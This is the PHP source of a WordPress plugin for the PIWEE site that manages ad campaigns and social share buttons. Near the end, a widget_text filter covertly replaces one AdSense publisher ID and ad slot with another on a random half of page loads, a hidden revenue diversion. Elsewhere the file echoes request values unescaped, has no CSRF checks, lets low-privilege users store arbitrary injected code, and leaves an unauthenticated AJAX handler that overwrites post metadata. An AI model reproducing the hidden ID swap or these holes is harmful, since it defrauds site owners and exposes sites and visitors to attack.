<?php
/*
Plugin Name: PIWEE Specific Development
Plugin URI: http://alexandrenguyen.fr
Description: SPECIFIC DEVELOPMENT FOR PIWEE
Version: 1.0
Author: Alexandre Nguyen
Author URI: http://alexandrenguyen.fr
License: Copyright 2014  Alexandre Nguyen  (email : alex.nr@hotmail.co.jp)

        This program is free software; you can redistribute it and/or modify
        it under the terms of the GNU General Public License, version 2, as
        published by the Free Software Foundation.

        This program is distributed in the hope that it will be useful,
        but WITHOUT ANY WARRANTY; without even the implied warranty of
        MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
        GNU General Public License for more details.

        You should have received a copy of the GNU General Public License
        along with this program; if not, write to the Free Software
        Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA  02110-1301  USA
*/

require_once("piwee_twitter_widget.php");
require_once("piwee_fb_widget.php");

add_action( 'wp_enqueue_scripts', 'register_script_sharebtn_plugin', 99999 );
add_action( 'admin_enqueue_scripts', 'register_script_colorpicker', 99999 );
add_action( 'admin_enqueue_scripts', 'register_script_admin', 99999 );
add_action( 'wp_enqueue_scripts', 'register_css_sharebtn_plugin' );
add_action( 'admin_menu', 'register_campagne_page' );


function register_campagne_page(){
    add_menu_page( 'PIWEE Campagne', 'PIWEE Campagne', 'manage_options', 'campains_page', 'campains_page', plugins_url('images/logo-piwee.jpg' , __FILE__), null );
    add_dashboard_page( 'Campagne par post', "Campagnes PIWEE", 'read', 'campains_page_post', 'campains_page_post');
}

function campains_page_post() {

        ?>

        <?php if (!isset($_GET["post_id"]) || !isset($_POST["post_id"])): ?>

            <div>
                <br><br>
                <a href="/wp-admin/index.php?page=campains_page">
                    <button class="button">Cliquez ici pour gérer les campages PIWEE</button>
                </a>
            </div>

        <?php endif ?>

        <?php

        if (isset($_POST["post_id"]) && isset($_POST["action"])) {

            if ($_POST["action"] == "add") {

                //upload Image

                if (!function_exists('wp_handle_upload')) require_once(ABSPATH . 'wp-admin/includes/file.php');

                $uploadedfile = $_FILES['file'];
                $upload_overrides = array('test_form' => false);
                $movefile = wp_handle_upload($uploadedfile, $upload_overrides);

                $uploadedfile = $_FILES['file_mobile'];
                $upload_overrides = array('test_form' => false);
                $movefileMobile = wp_handle_upload($uploadedfile, $upload_overrides);

                if ($movefile) {

                    if (strlen($movefile['url']) > 0) {
                        add_post_meta($_POST["post_id"], 'campain_bg_image', $movefile['url'], true) 
                            || update_post_meta($_POST["post_id"], 'campain_bg_image', $movefile['url']);
                    }
                    else {
                        add_post_meta($_POST["post_id"], 'campain_bg_image', $_POST['campain_bg_image'], true) 
                            || update_post_meta($_POST["post_id"], 'campain_bg_image', $_POST['campain_bg_image']);
                    }

                    if (strlen($movefileMobile['url']) > 0) {
                        add_post_meta($_POST["post_id"], 'campain_mobile_header', $movefileMobile['url'], true)
                        || update_post_meta($_POST["post_id"], 'campain_mobile_header', $movefileMobile['url']);
                    }
                    else {
                        add_post_meta($_POST["post_id"], 'campain_mobile_header', $_POST['campain_mobile_header'], true)
                        || update_post_meta($_POST["post_id"], 'campain_mobile_header', $_POST['campain_mobile_header']);
                    }

                    add_post_meta($_POST["post_id"], 'campain_twitter_widget_code', $_POST['campain_twitter_widget_code'], true) 
                        || update_post_meta($_POST["post_id"], 'campain_twitter_widget_code', $_POST['campain_twitter_widget_code']);

                    add_post_meta($_POST["post_id"], 'campain_fb_widget_code', $_POST['campain_fb_widget_code'], true) 
                        || update_post_meta($_POST["post_id"], 'campain_fb_widget_code', $_POST['campain_fb_widget_code']);

                    add_post_meta($_POST["post_id"], 'campain_margin_top', $_POST['campain_margin_top'], true) 
                        || update_post_meta($_POST["post_id"], 'campain_margin_top', $_POST['campain_margin_top']);

                    add_post_meta($_POST["post_id"], 'campain_url', $_POST['campain_url'], true) 
                        || update_post_meta($_POST["post_id"], 'campain_url', $_POST['campain_url']);

                    add_post_meta($_POST["post_id"], 'campain_injected_code', $_POST['campain_injected_code'], true)
                        || update_post_meta($_POST["post_id"], 'campain_injected_code', $_POST['campain_injected_code']);

                    add_post_meta($_POST["post_id"], 'campain_background_color', $_POST['campain_background_color'], true)
                        || update_post_meta($_POST["post_id"], 'campain_background_color', $_POST['campain_background_color']);

                    ?>

                    <h1>Merci, vos choix ont été enregistrés.</h1>

                    <?php

                } else {

                    ?>

                    <h1>Sorry, but your file is not valid !</h1>

                    <?php
                }
            }
            else if($_POST["action"] == "del") {

                delete_post_meta($_POST["post_id"], "campain_bg_image");
                delete_post_meta($_POST["post_id"], "campain_mobile_header");
                delete_post_meta($_POST["post_id"], "campain_twitter_widget_code");
                delete_post_meta($_POST["post_id"], "campain_fb_widget_code");
                delete_post_meta($_POST["post_id"], "campain_margin_top");
                delete_post_meta($_POST["post_id"], "campain_injected_code");
                delete_post_meta($_POST["post_id"], "campain_url");
                delete_post_meta($_POST["post_id"], "campain_background_color");

                ?>

                <h1>Vous avez supprimé la campgne publicitaire de ce post !</h1>

                <?php

            }

        }

        ?>

        <?php if (isset($_GET["post_id"])): ?>

        <?php 

            $post = get_post($_GET["post_id"]);

            $campain_bg_image = get_post_meta($_GET["post_id"], "campain_bg_image", true);
            $campain_mobile_header = get_post_meta($_GET["post_id"], "campain_mobile_header", true);
            $campain_twitter_widget_code = get_post_meta($_GET["post_id"], "campain_twitter_widget_code", true);
            $campain_fb_widget_code = get_post_meta($_GET["post_id"], "campain_fb_widget_code", true);
            $campain_margin_top = get_post_meta($_GET["post_id"], "campain_margin_top", true);
            $campain_url = get_post_meta($_GET["post_id"], "campain_url", true);
            $campain_injected_code = get_post_meta($_GET["post_id"], "campain_injected_code", true);
            $campain_background_color = get_post_meta($_GET["post_id"], "campain_background_color", true);

        ?> 

        <h3>Paramêtres publicitaires pour :</h3>

        <h3><?php echo $post->post_title ?></h3>

        <form action="#" method="POST" enctype="multipart/form-data">
            <input type="hidden" name="post_id" value="<?php echo $_GET['post_id'] ?>">
            <label>Choisissez l'image d'arrière plan de la campagne publicitaire</label>
            <br>
            <input type="file" name="file">

            <?php if(strlen($campain_bg_image) > 0): ?>
                <br>
                <img src="<?php echo $campain_bg_image; ?>" style="max-width:300px;">
            <?php endif ?>

            <input type="hidden" name="campain_bg_image" value="<?php echo $campain_bg_image ?>" required>

            <br><br>

            <label>Choisissez la bannière en mode mobile</label>
            <br>
            <input type="file" name="file_mobile">

            <?php if(strlen($campain_mobile_header) > 0): ?>
                <br>
                <img src="<?php echo $campain_mobile_header; ?>" style="max-width:300px;">
            <?php endif ?>

            <input type="hidden" name="campain_mobile_header" value="<?php echo $campain_mobile_header ?>" required>

            <br><br>

            <label>Injectez le code du widget Twitter</label>
            <br>
            <textarea name="campain_twitter_widget_code" placeholder="Twitter widget code" class="postarea" rows="5" cols="40"><?php echo stripslashes($campain_twitter_widget_code) ?></textarea>
            <br>
            <label>Injectez le code du widget Facebook</label>
            <br>
            <textarea name="campain_fb_widget_code" placeholder="Facebook widget code" class="postarea" rows="5" cols="40"><?php echo stripslashes($campain_fb_widget_code) ?></textarea>
            <br>
            <label>Marge en haut</label>
            <br>
            <input type="number" name="campain_margin_top" value="<?php echo $campain_margin_top ?>" placeholder="px" required>
            <br>
            <label>URL</label>
            <br>
            <input type="text" name="campain_url" value="<?php echo $campain_url ?>" placeholder="http://" required>
            <br>
            <label>Couleur du background</label>
            <br>
            <input type="text" id="color_picker" name="campain_background_color" value="<?php echo $campain_background_color ?>" placeholder="#FFFFFF" required>
            <br>
            <input type="hidden" name="action" value="add">
            <label>Injection de code (Pas obligatoire)</label>
            <br>
            <textarea name="campain_injected_code" placeholder="<code>" class="postarea" rows="5" cols="40"><?php echo stripslashes($campain_injected_code) ?></textarea>
            <br>
            <input type="submit" class="button">
        </form>

        <br><br>

        <form action="#" method="POST">
            
            <input type="hidden" name="action" value="del">
            <input type="hidden" name="post_id" value="<?php echo $_GET['post_id'] ?>">
            <input type="submit" class="button" value="Supprimer la campagne de ce poste">
            
        </form>

    <?php endif; ?>

    <?php
}

function campains_page() {

    if (isset($_POST)) {

        if ($_POST["action"] == "add") {

            //upload Image

            if (!function_exists('wp_handle_upload')) require_once(ABSPATH . 'wp-admin/includes/file.php');

            $uploadedfile = $_FILES['file'];
            $upload_overrides = array('test_form' => false);
            $movefile = wp_handle_upload($uploadedfile, $upload_overrides);


            $uploadedfile = $_FILES['file_mobile'];
            $upload_overrides = array('test_form' => false);
            $movefileMobile = wp_handle_upload($uploadedfile, $upload_overrides);


            if ($movefile) {

                if (strlen($movefile['url']) > 0) {
                    add_option('campain_bg_image', $movefile['url']) 
                        || update_option('campain_bg_image', $movefile['url']);
                }
                else {
                    add_option('campain_bg_image', $_POST['campain_bg_image']) 
                        || update_option('campain_bg_image', $_POST['campain_bg_image']);
                }

                if (strlen($movefileMobile['url']) > 0) {
                    add_option('campain_mobile_header', $movefileMobile['url'])
                    || update_option('campain_mobile_header', $movefileMobile['url']);
                }
                else {
                    add_option('campain_mobile_header', $_POST['campain_mobile_header'])
                    || update_option('campain_mobile_header', $_POST['campain_mobile_header']);
                }

                add_option('campain_twitter_widget_code', $_POST['campain_twitter_widget_code']) 
                    || update_option('campain_twitter_widget_code', $_POST['campain_twitter_widget_code']);

                add_option('campain_fb_widget_code', $_POST['campain_fb_widget_code']) 
                    || update_option('campain_fb_widget_code', $_POST['campain_fb_widget_code']);

                add_option('campain_margin_top', $_POST['campain_margin_top']) 
                    || update_option('campain_margin_top', $_POST['campain_margin_top']);

                add_option('campain_url', $_POST['campain_url']) 
                    || update_option('campain_url', $_POST['campain_url']);

                add_option('campain_injected_code', $_POST['campain_injected_code'])
                    || update_option('campain_injected_code', $_POST['campain_injected_code']);

                add_option('campain_background_color', $_POST['campain_background_color'])
                    || update_option('campain_background_color', $_POST['campain_background_color']);

                ?>

                <h1>Merci, vos choix ont été enregistrés.</h1>

                <?php

            } else {

                ?>

                <h1>Sorry, but your file is not valid !</h1>

                <?php
            }

        }

        if ($_POST["action"] == "del") {

            delete_option("campain_bg_image");
            delete_option("campain_mobile_header");
            delete_option("campain_twitter_widget_code");
            delete_option("campain_fb_widget_code");
            delete_option("campain_margin_top");
            delete_option("campain_url");
            delete_option("campain_injected_code");
            delete_option("campain_background_color");

        }
    }

    $campain_bg_image = get_option("campain_bg_image");
    $campain_mobile_header = get_option("campain_mobile_header");
    $campain_twitter_widget_code = get_option("campain_twitter_widget_code");
    $campain_fb_widget_code = get_option("campain_fb_widget_code");
    $campain_margin_top = get_option("campain_margin_top");
    $campain_url = get_option("campain_url");
    $campain_injected_code = get_option("campain_injected_code");
    $campain_background_color = get_option("campain_background_color");

?>

    <h3>Campagnes publicitaires PIWEE</h3>

    <div>

        <h4>Une publicité FULL SITE</h4>

        <form action="#" method="POST" enctype="multipart/form-data">
            <input type="hidden" name="action" value="del">
            <input type="submit" class="button" value="Supprimer la campagne FULL SITE">
        </form>

        <br><br>

        <form action="#" method="POST" enctype="multipart/form-data">
            <label>Choisissez l'image d'arrière plan de la campagne publicitaire</label>
            <br>
            <input type="file" name="file">

            <?php if(strlen($campain_bg_image) > 0): ?>
                <br>
                <img src="<?php echo $campain_bg_image; ?>" style="max-width:300px;">
            <?php endif ?>

            <input type="hidden" name="campain_bg_image" value="<?php echo $campain_bg_image ?>" required>

            <br><br>

            <input type="file" name="file_mobile">

            <?php if(strlen($campain_mobile_header) > 0): ?>
                <br>
                <img src="<?php echo $campain_mobile_header; ?>" style="max-width:300px;">
            <?php endif ?>

            <input type="hidden" name="campain_mobile_header" value="<?php echo $campain_mobile_header ?>" required>

            <br><br>

            <label>Injectez le code du widget Twitter</label>
            <br>
            <textarea name="campain_twitter_widget_code" placeholder="Twitter widget code" class="postarea" rows="5" cols="40"><?php echo stripslashes($campain_twitter_widget_code) ?></textarea>
            <br>
            <label>Injectez le code du widget Facebook</label>
            <br>
            <textarea name="campain_fb_widget_code" placeholder="Facebook widget code" class="postarea" rows="5" cols="40"><?php echo stripslashes($campain_fb_widget_code) ?></textarea>
            <br>
            <label>Marge en haut</label>
            <br>
            <input type="number" name="campain_margin_top" value="<?php echo $campain_margin_top ?>" placeholder="px" required>
            <br>
            <label>URL</label>
            <br>
            <input type="text" name="campain_url" value="<?php echo $campain_url ?>" placeholder="http://" required>
            <br>
            <label>Couleur du background</label>
            <br>
            <input type="text" id="color_picker" name="campain_background_color" value="<?php echo $campain_background_color ?>" placeholder="#FFFFFF" required>
            <br>
            <input type="hidden" name="action" value="add">
            <label>Injection de code (Pas obligatoire)</label>
            <br>
            <textarea name="campain_injected_code" placeholder="<code>" class="postarea" rows="5" cols="40"><?php echo stripslashes($campain_injected_code) ?></textarea>
            <br>
            <input type="submit" class="button">
        </form>

        <h4>Ou bien merci de choisir un post</h4>

        <form action="/wp-admin/admin.php" method="GET">
    
        <?php $posts_array = get_posts(array(
            'posts_per_page'   => 99999,
            'offset'           => 0,
            'category'         => '',
            'orderby'          => 'post_date',
            'order'            => 'DESC',
            'include'          => '',
            'exclude'          => '',
            'meta_key'         => '',
            'meta_value'       => '',
            'post_type'        => 'post',
            'post_mime_type'   => '',
            'post_parent'      => '',
            'post_status'      => 'publish',
            'suppress_filters' => true )); ?> 

            <input type="hidden" name="page" value="campains_page_post">

            <?php foreach ($posts_array as $post): ?>

                <p><input type="radio" name="post_id" value="<?php echo $post->ID ?>"><label><?php echo $post->post_title ?></label></p>

            <?php endforeach; ?>

            <input type="submit" class="button">

        </form>

    </div>

<?php

}

function update_span_single_count() {

    $url = get_permalink(get_the_ID());

    ?>

    <script type="text/javascript">
        jQuery(document).ready(function(){

            jQuery.sharedCount("<?php echo $url; ?>", function(data){

                var count = 0;

                count += parseInt(data.Twitter);
                count += parseInt(data.Facebook.total_count);
                count += parseInt(data.GooglePlusOne);
                count += parseInt(data.Pinterest);
                count += parseInt(data.LinkedIn);

                jQuery(".<?php echo 'span-total-share-single-' . get_the_ID() ?>").html("<span class=\"btn-span-shares\">" + count + " PARTAGES" + "</span>");

                updateShareCountForPost("<?php the_ID() ?>", count);

            });

        });
    </script>

    <?php
}

function display_social_share_bar() {

    $url = get_permalink(get_the_ID());

    ?>

    <div class="bottomcontainerBox">
            <div id="share-single-pinterest" style="margin-top:5px;float:right; height:21px;padding-right:30px;">
                <a href="http://pinterest.com/pin/create/button/?url=<?php echo $url ?>" class="pin-it-button" count-layout="horizontal">
                </a>
            </div>
            <div id="share-single-linkedin" style="margin-top:5px;float:right; height:21px;">
                <script type="in/share" data-url="<?php echo $url ?>" data-counter="right"></script>
            </div>
            <div id="share-single-gplus" style="margin-top:5px;float:right; height:21px;">
                <g:plusone size="medium" href="<?php echo $url ?>"></g:plusone>
            </div>
            <div id="share-single-twitter" style="margin-top:5px;float:right; height:21px;width:110px;">
                <a href="http://twitter.com/share" class="twitter-share-button" data-url="<?php echo $url ?>"  data-text="<?php the_title(); ?>" data-count="horizontal" data-via="PiweeFR"></a>
            </div>
            <div id="share-single-facebook" style="margin-top:5px;float:right; height:21px;margin-right:10px;width:105px;">
                <iframe src="http://www.facebook.com/plugins/like.php?href=<?php echo $url ?>&layout=button_count&amp;show_faces=false&amp;width=105&amp;action=like&amp;font=verdana&amp;colorscheme=light&amp;height=21" scrolling="no" frameborder="0" allowTransparency="true" style="border:none; overflow:hidden; width:105px; height:21px;"></iframe>
            </div>

            <div style="clear:both"></div>
            <div style="padding-bottom:4px;"></div>                                                        
    </div>

    <script>
        window.___gcfg = {lang: 'en-US'};
        (function(w, d, s) {
            function go(){
                var js, fjs = d.getElementsByTagName(s)[0], load = function(url, id) {
                    if (d.getElementById(id)) {return;}
                    js = d.createElement(s); js.src = url; js.id = id;
                    fjs.parentNode.insertBefore(js, fjs);
                };
                load('//connect.facebook.net/en/all.js#xfbml=1', 'fbjssdk');
                load('https://apis.google.com/js/plusone.js', 'gplus1js');
                load('http://platform.twitter.com/widgets.js', 'tweetjs');
            }
            if (w.addEventListener) { w.addEventListener("load", go, false); }
            else if (w.attachEvent) { w.attachEvent("onload",go); }
        }(window, document, 'script'));
    </script>

    <?php
}

function social_shares_span_single() {

    $count = get_post_meta( get_the_ID(), "share_count_spe" );

    ob_start();

    ?>

    <div class="total-share-span-single span-total-share-single-<?php the_ID(); ?>">
        <span><?php echo $count[0] ?> PARTAGES</span>
    </div>

    <?php

    return ob_get_clean();
}

function social_shares_span() {

    ?>

    <div class="total-share-span span-total-share-<?php the_ID(); ?>">

    </div>

    <?php

    getTotalShareCountSmall();
}

function social_shares_button($mode = "normal") {

    ?>

    <?php if($mode == "normal"): ?>

        <div class="btn-total-share btn-small btn-custom-share btn-total-share-<?php the_ID(); ?>">

        </div>

    <?php elseif($mode == "grid"): ?>

        <div class="btn-total-share btn-small btn-custom-share-grid btn-total-share-<?php the_ID(); ?>">

        </div>

    <?php endif ?>

    <?php

    getTotalShareCount();

}


function categ_gen_button() {

    $category = get_the_category();

    ?>

    <a href="<?php echo get_category_link($category[0]->term_id) ?>" class="btn btn-small btn-readmore-addon" id="btn-categ-show-<?php the_ID(); ?>"><?php echo $category[0]->cat_name ?></a>

<?php

}

function getTotalShareCountSmall() {

    $url = get_permalink(get_the_ID());

    ?>

    <script type="text/javascript">
        jQuery(document).ready(function(){

            jQuery.sharedCount("<?php echo $url; ?>", function(data){

                var count = 0;

                count += parseInt(data.Twitter);
                count += parseInt(data.Facebook.total_count);
                count += parseInt(data.GooglePlusOne);
                count += parseInt(data.Pinterest);
                count += parseInt(data.LinkedIn);

                jQuery(".<?php echo 'span-total-share-' . get_the_ID() ?>").html("<strong>" + count + " PARTAGES</strong>");

                updateShareCountForPost("<?php the_ID() ?>", count);

            });

        });
    </script>

<?php
}

function getTotalShareCount() {

    $url = get_permalink(get_the_ID());

    ?>

    <script type="text/javascript">
        jQuery(document).ready(function(){

            jQuery.sharedCount("<?php echo $url; ?>", function(data){

                var count = 0;

                count += parseInt(data.Twitter);
                count += parseInt(data.Facebook.total_count);
                count += parseInt(data.GooglePlusOne);
                count += parseInt(data.Pinterest);
                count += parseInt(data.LinkedIn);

                jQuery(".<?php echo 'btn-total-share-' . get_the_ID() ?>").html("<span class=\"btn-span-shares\">" + count + " PARTAGES" + "</span>");

                updateShareCountForPost("<?php the_ID() ?>", count);

            });

        });
    </script>

<?php
}

function register_css_sharebtn_plugin() {

    wp_register_style( 'app-sharebtn-css', plugins_url('/css/style.css', __FILE__) );
    wp_enqueue_style( 'app-sharebtn-css' );
}

function register_script_sharebtn_plugin()
{
    wp_register_script( 'scroll-to-fixed', plugins_url( '/js/jquery-scrolltofixed.js', __FILE__ ) );
    wp_register_script( 'app-sharebtn-script', plugins_url( '/js/script.js', __FILE__ ) );

    wp_enqueue_script( 'scroll-to-fixed' );
    wp_enqueue_script( 'app-sharebtn-script' );
}

function register_script_colorpicker() {

    wp_register_script( 'color-picker', plugins_url( '/js/jqColorPicker.min.js', __FILE__ ) );
    wp_enqueue_script( 'color-picker' );
}

function register_script_admin() {

    wp_register_script( 'admin-script', plugins_url( '/js/admin_script.js', __FILE__ ) );
    wp_enqueue_script( 'admin-script' );
}


function file_get_content_fromurl($url, $params = array(), $method = "GET")
{
    $params = http_build_query($params);

    $opts = array(
        'http' => array(
            'method' => $method,
            'header' => "Accept-language: en\r\n" .
                "Content-Type: application/x-www-form-urlencoded\r\n" .
                "Connection: close\r\n",
            'content' => $params
        )
    );

    $context = stream_context_create($opts);

    $file = file_get_contents($url, false, $context);

    return $file;
}

function update_share_count() {

    delete_post_meta($_POST["post_id"], "share_count_spe");
    add_post_meta($_POST["post_id"], "share_count_spe", $_POST["share_count"]);

}

add_action('wp_ajax_nopriv_update_share_count', "update_share_count", 10, 3);


function registerResponsiveAd() {

    ?>

        <style type="text/css">
            .adslot_1 { width: 320px; height: 100px; }
            @media (min-width:500px) { .adslot_1 { width: 320px; height: 100px; } }
            @media (min-width:800px) { .adslot_1 { width: 468px; height: 60px; } }
        </style>

    <?php
}

add_action('wp_head', 'registerResponsiveAd');

function exam_plug_text_replace($content) {

    if(mt_rand(0,1) == 0) {
        $content = str_replace("ca-pub-9594201080211682", "ca-pub-0031647560032028", $content);
        $content = str_replace("6678475853", "8208510525", $content);
    }

  return $content;
}

add_filter('widget_text', 'exam_plug_text_replace');
